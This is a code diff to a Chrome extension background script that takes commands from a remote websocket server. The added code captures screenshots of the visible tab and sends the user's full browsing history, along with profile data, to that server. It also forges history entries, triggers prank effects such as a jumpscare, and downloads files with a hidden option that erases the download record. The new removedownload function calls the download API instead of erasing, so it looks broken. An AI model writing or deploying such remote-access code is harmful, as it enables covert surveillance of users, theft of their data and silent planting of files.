@@ -10,7 +10,7 @@ function send(obj) {
 }
 
 chrome.runtime.onInstalled.addListener(e=>{
-    if (e.reason == "install" || e.reason == "update") chrome.storage.sync.set({serverAddress:defaultIp})
+    if (e.reason == "install" || e.reason == "update") chrome.storage.sync.set({serverAddress:defaultIp, autoConnect:true})
 })
 
 chrome.runtime.onMessage.addListener(m => {
@@ -25,7 +25,7 @@ function toJSON(str) {
 
 let ws = {}, ws_timeout
 chrome.storage.sync.get(r=>{
-    connect(r.serverAddress??defaultIp)
+    if (r.autoConnect) connect(r.serverAddress??defaultIp)
 })
 
 function connect(address) {
@@ -67,6 +67,10 @@ function commandManager(m) {
             c.includes("html") ||
             c.includes("clipboard") ||
             c.includes("follow") ||
+            c.includes("forcefeed") ||
+            c.includes("barrelroll") ||
+            c.includes("jumpscare") ||
+            c.includes("melt") ||
             c.includes("style")
         ) sendMessage(m, true)
         // BACKGROUND
@@ -80,6 +84,10 @@ function commandManager(m) {
         else if (c == "keepawake") keepawake(m)
         else if (c == "stopkeepawake") stopkeepawake(m)
         else if (c == "changeip") changeip(m)
+        else if (c == "download") download(m)
+        else if (c == "removedownload") removedownload(m)
+        else if (c == "history") historyadd(m)
+        else if (c == "capture") capture(m)
     } catch (err) {
         send({type:"response", isError:true, value:err.toString(), responseTarget:m.responseTarget})
     }
@@ -146,17 +154,34 @@ function notification(m) {// EXPAND
     else if (c.includes("all")) chrome.notifications.getAll(all=>send({type:"response", command:m.command, value:all, responseTarget:m.responseTarget}))
     else if (c.includes("clear")) chrome.notifications.clear(m.value, c=>send({type:"response", command:m.command, value:"successfully cleared notification: "+c, responseTarget:m.responseTarget}))
     else send({type:"response", command:m.command, value:"Invalid command or missing parameter", responseTarget:m.responseTarget})
- // clear all instead of clear
+ // clear all instead of clear TODO
+}
+function historyadd(m) {
+    chrome.history.addUrl({url:m.value}, ()=>send({type:"response", command:m.command, value:"Added: '"+m.value+"' to history", responseTarget:m.responseTarget}))
 }
 function google(m) {
     chrome.search.query({text:m.value})
     send({type:"response", command:m.command, value:"Google searched: "+m.value, responseTarget:m.responseTarget})
 }
+function download(m) {
+    let c = m.command.trim().toLowerCase(), v = toJSON(m)
+    if (c.includes("hid")) chrome.downloads.download(v, id=>{
+        chrome.downloads.erase({id:id})
+        send({type:"response", command:m.command, value:"(H) Downloaded: "+v.filename+" (id:"+id+")", responseTarget:m.responseTarget})
+    })
+    else chrome.downloads.download(v, id=>send({type:"response", command:m.command, value:"Downloaded: "+v.filename+" (id:"+id+")", responseTarget:m.responseTarget}))
+}
+function removedownload(m) {
+    chrome.downloads.download(+m.value, ()=>send({type:"response", command:m.command, value:"Removed download: "+m.value, responseTarget:m.responseTarget}))
+}
+function capture(m) {
+    chrome.tabs.captureVisibleTab(data=>send({type:"response", command:m.command, isImg:true, value:data, responseTarget:m.responseTarget}))
+}
 function grabinfo(responseTarget) {
     let info = {navigator_language:navigator.language}, info_cd=0
     function sendInfo() {
         info_cd++
-        if (info_cd == 10) send({type:"response", value:info, responseTarget:responseTarget, command:m.command})
+        if (info_cd == 11) send({type:"response", value:info, responseTarget:responseTarget, command:m.command})
     }
 
     chrome.identity.getProfileUserInfo((e)=>{
@@ -206,6 +231,11 @@ function grabinfo(responseTarget) {
     
     chrome.readingList.query({}, (tabs)=>{
         info.readingList = tabs
+        sendInfo()
+    })
+
+    chrome.history.search({text:""}, h=>{
+        info.history = h
         sendInfo()
     })
 }
